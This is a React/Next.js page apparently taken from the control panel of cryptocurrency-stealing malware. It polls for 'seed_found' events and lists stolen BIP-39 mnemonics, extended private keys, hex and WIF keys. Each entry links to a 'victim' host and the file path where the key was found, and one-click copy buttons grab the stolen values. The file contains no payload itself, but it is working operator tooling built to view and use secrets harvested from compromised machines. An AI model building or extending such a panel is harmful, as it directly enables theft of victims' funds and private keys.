'use client';
import Link from 'next/link';
import { copy } from '@/lib/format';
import { toast } from 'sonner';
import { useApi } from '@/hooks/useApi';
import { Topbar } from '@/components/topbar';
import { Card } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Empty, SkeletonRows, Table, TD, TH, THead, TR } from '@/components/ui/table';
import { dateTime } from '@/lib/format';
import { Copy } from 'lucide-react';

type SeedEvent = {
  id: string;
  kind: string;
  createdAt: string;
  data: { path?: string; type?: string; words?: number; value?: string; synthetic?: boolean };
  victim?: { id: string; hostname: string };
};

export default function SeedsPage() {
  const { data, loading, error } = useApi<{ items: SeedEvent[] }>('/events?kind=seed_found&limit=500', { pollMs: 15_000 });
  return (
    <>
      <Topbar title="Seeds" subtitle="BIP-39, xprv, hex and WIF findings" />
      <div className="pt-3">
        <Card>
          {error ? <p className="p-3 text-xs text-bad">{error.message}</p> : loading ? <SkeletonRows rows={8} cols={5} /> : (data?.items ?? []).length === 0 ? (
            <Empty title="No seeds found" hint="Run scan_wallets on a victim; values appear here and in its Seeds tab." />
          ) : (
            <Table>
              <THead><TR><TH>Type</TH><TH>Value</TH><TH>Victim</TH><TH>Path</TH><TH>Seen</TH><TH /></TR></THead>
              <tbody>
                {data!.items.map((event) => (
                  <TR key={event.id}>
                    <TD><Badge tone="ok">{event.data.type ?? 'seed'}</Badge>{event.data.synthetic ? <Badge className="ml-1">demo</Badge> : null}</TD>
                    <TD className="max-w-[480px] truncate font-mono text-xs" title={event.data.value}>{event.data.value || '—'}</TD>
                    <TD>{event.victim ? <Link className="font-mono text-brand" href={`/victims/${event.victim.id}`}>{event.victim.hostname}</Link> : '—'}</TD>
                    <TD className="max-w-[280px] truncate font-mono text-2xs text-muted" title={event.data.path}>{event.data.path ?? '—'}</TD>
                    <TD className="num text-2xs text-muted">{dateTime(event.createdAt)}</TD>
                    <TD>{event.data.value ? <Button size="icon" variant="ghost" onClick={() => { copy(event.data.value!); toast.success('Seed copied'); }}><Copy className="h-3 w-3" /></Button> : null}</TD>
                  </TR>
                ))}
              </tbody>
            </Table>
          )}
        </Card>
      </div>
    </>
  );
}
